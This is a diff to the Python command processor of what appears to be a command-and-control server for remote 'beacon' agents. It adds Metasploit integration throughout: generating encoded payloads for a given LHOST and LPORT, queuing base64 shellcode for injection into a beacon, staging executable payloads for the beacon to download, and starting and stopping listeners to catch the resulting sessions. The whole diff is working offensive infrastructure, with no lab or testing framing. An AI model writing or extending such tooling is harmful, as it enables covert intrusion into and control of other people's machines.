@@ -1,5 +1,7 @@
 from pathlib import Path
 from datetime import datetime
+from typing import Dict, Any, Optional, Tuple
+import base64
 from database import BeaconRepository
 from config import ServerConfig
 
@@ -7,6 +9,7 @@ class CommandProcessor:
     """Processes and validates agent commands"""
     def __init__(self, beacon_repository: BeaconRepository):
         self.beacon_repository = beacon_repository
+        self._metasploit_service = None
 
     def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
         import utils  # Import here to avoid circular imports
@@ -115,3 +118,205 @@ class CommandProcessor:
         
         # Default case for regular commands
         return f"execute_command|{command}"
+    
+    @property
+    def metasploit_service(self):
+        """Lazy load Metasploit service"""
+        if self._metasploit_service is None:
+            from .metasploit_service import MetasploitService
+            self._metasploit_service = MetasploitService()
+        return self._metasploit_service
+    
+    def process_metasploit_module(self, beacon_id: str, module_name: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
+        """
+        Process Metasploit integration modules
+        
+        Returns:
+            Tuple of (success, message)
+        """
+        import utils
+        
+        try:
+            if module_name == "deliver_payload":
+                return self._handle_deliver_payload(beacon_id, parameters)
+            elif module_name == "start_listener":
+                return self._handle_start_listener(parameters)
+            elif module_name == "stop_listener":
+                return self._handle_stop_listener(parameters)
+            else:
+                return False, f"Unknown Metasploit module: {module_name}"
+                
+        except Exception as e:
+            error_msg = f"Error processing Metasploit module {module_name}: {str(e)}"
+            if utils.logger:
+                utils.logger.log_message(error_msg)
+            return False, error_msg
+    
+    def _handle_deliver_payload(self, beacon_id: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
+        """Handle payload delivery to a beacon"""
+        import utils
+        from .metasploit_service import PayloadConfig
+        
+        try:
+            # Extract parameters
+            payload_type = parameters.get('payload_type')
+            lhost = parameters.get('LHOST')
+            lport = int(parameters.get('LPORT', 4444))
+            format_type = parameters.get('format', 'exe')
+            encoder = parameters.get('encoder', 'none')
+            iterations = int(parameters.get('iterations', 1))
+            
+            if not payload_type or not lhost:
+                return False, "Missing required parameters: payload_type and LHOST"
+            
+            # Auto-detect LHOST if needed
+            if not lhost or lhost == "auto":
+                lhost = self.metasploit_service.get_server_ip()
+            
+            # Create payload configuration
+            payload_config = PayloadConfig(
+                payload_type=payload_type,
+                lhost=lhost,
+                lport=lport,
+                format=format_type,
+                encoder=encoder if encoder != 'none' else None,
+                iterations=iterations
+            )
+            
+            if utils.logger:
+                utils.logger.log_message(f"Generating Metasploit payload for beacon {beacon_id}: {payload_type}")
+            
+            # Generate the payload
+            success, payload_data, error_msg = self.metasploit_service.generate_payload(payload_config)
+            
+            if not success:
+                return False, f"Payload generation failed: {error_msg}"
+            
+            # Determine delivery method based on format
+            if format_type == 'raw':
+                # For raw shellcode, use injection if beacon supports it
+                return self._deliver_shellcode(beacon_id, payload_data)
+            else:
+                # For executables, use file transfer + execute
+                return self._deliver_executable(beacon_id, payload_data, format_type)
+            
+        except Exception as e:
+            return False, f"Error in payload delivery: {str(e)}"
+    
+    def _deliver_shellcode(self, beacon_id: str, shellcode: bytes) -> Tuple[bool, str]:
+        """Deliver raw shellcode to beacon for injection"""
+        import utils
+        
+        try:
+            # Encode shellcode as base64 for safe transmission
+            shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
+            
+            # Create injection command (this would depend on beacon capabilities)
+            # For now, we'll queue it as a special command
+            injection_command = f"inject_shellcode|{shellcode_b64}"
+            
+            # Queue the command for the beacon
+            self.beacon_repository.update_beacon_command(beacon_id, injection_command)
+            
+            if utils.logger:
+                utils.logger.log_message(f"Queued shellcode injection for beacon {beacon_id} ({len(shellcode)} bytes)")
+            
+            return True, f"Shellcode injection queued ({len(shellcode)} bytes)"
+            
+        except Exception as e:
+            return False, f"Error delivering shellcode: {str(e)}"
+    
+    def _deliver_executable(self, beacon_id: str, executable_data: bytes, format_type: str) -> Tuple[bool, str]:
+        """Deliver executable payload to beacon via file transfer"""
+        import utils
+        from config import ServerConfig
+        
+        try:
+            config = ServerConfig()
+            
+            # Create temporary filename for the payload
+            import uuid
+            temp_filename = f"payload_{uuid.uuid4().hex[:8]}.{format_type}"
+            temp_filepath = Path(config.FILES_FOLDER) / temp_filename
+            
+            # Write payload to temporary file
+            with open(temp_filepath, 'wb') as f:
+                f.write(executable_data)
+            
+            # Queue file transfer command (beacon will download the file)
+            transfer_command = f"download_file|{temp_filename}"
+            self.beacon_repository.update_beacon_command(beacon_id, transfer_command)
+            
+            if utils.logger:
+                utils.logger.log_message(f"Queued payload download for beacon {beacon_id}: {temp_filename} ({len(executable_data)} bytes)")
+            
+            # Note: In a complete implementation, we'd need to:
+            # 1. Wait for download completion
+            # 2. Queue execution command
+            # 3. Clean up the temporary file
+            # This would require a more sophisticated workflow system
+            
+            return True, f"Payload download queued: {temp_filename} ({len(executable_data)} bytes)"
+            
+        except Exception as e:
+            return False, f"Error delivering executable: {str(e)}"
+    
+    def _handle_start_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
+        """Handle starting a Metasploit listener"""
+        import utils
+        from .metasploit_service import ListenerConfig
+        
+        try:
+            payload_type = parameters.get('payload_type')
+            lhost = parameters.get('LHOST', '0.0.0.0')
+            lport = int(parameters.get('LPORT', 4444))
+            exit_on_session = bool(parameters.get('ExitOnSession', False))
+            
+            if not payload_type:
+                return False, "Missing required parameter: payload_type"
+            
+            # Create listener configuration
+            listener_config = ListenerConfig(
+                payload_type=payload_type,
+                lhost=lhost,
+                lport=lport,
+                exit_on_session=exit_on_session
+            )
+            
+            if utils.logger:
+                utils.logger.log_message(f"Starting Metasploit listener: {payload_type} on {lhost}:{lport}")
+            
+            # Start the listener
+            success, job_id, error_msg = self.metasploit_service.start_listener(listener_config)
+            
+            if success:
+                return True, f"Listener started with job ID: {job_id}"
+            else:
+                return False, f"Failed to start listener: {error_msg}"
+                
+        except Exception as e:
+            return False, f"Error starting listener: {str(e)}"
+    
+    def _handle_stop_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
+        """Handle stopping a Metasploit listener"""
+        import utils
+        
+        try:
+            job_id = parameters.get('job_id')
+            
+            if not job_id:
+                return False, "Missing required parameter: job_id"
+            
+            if utils.logger:
+                utils.logger.log_message(f"Stopping Metasploit listener: {job_id}")
+            
+            # Stop the listener
+            success, error_msg = self.metasploit_service.stop_listener(job_id)
+            
+            if success:
+                return True, f"Listener {job_id} stopped"
+            else:
+                return False, f"Failed to stop listener: {error_msg}"
+                
+        except Exception as e:
+            return False, f"Error stopping listener: {str(e)}"
